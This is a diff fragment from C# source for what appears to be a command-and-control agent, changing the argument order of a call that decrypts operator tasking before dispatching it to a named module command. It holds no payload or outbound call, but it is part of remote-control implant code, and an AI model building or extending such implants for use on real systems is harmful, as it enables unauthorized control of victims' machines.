@@ -58,7 +58,7 @@ namespace Agent.Controllers
 
         void HandleC2Data(AgentMessage Message)
         {
-            var c2Data = Shared.Utilities.Utilities.DecryptData<C2Data>(SessionKey, Message.Data, Message.IV);
+            var c2Data = Shared.Utilities.Utilities.DecryptData<C2Data>(Message.Data, SessionKey, Message.IV);
 
             var callback = AgentModules.FirstOrDefault(m => m.Name.Equals(c2Data.Module, StringComparison.OrdinalIgnoreCase)).Commands
                 .FirstOrDefault(c => c.Name.Equals(c2Data.Command, StringComparison.OrdinalIgnoreCase))
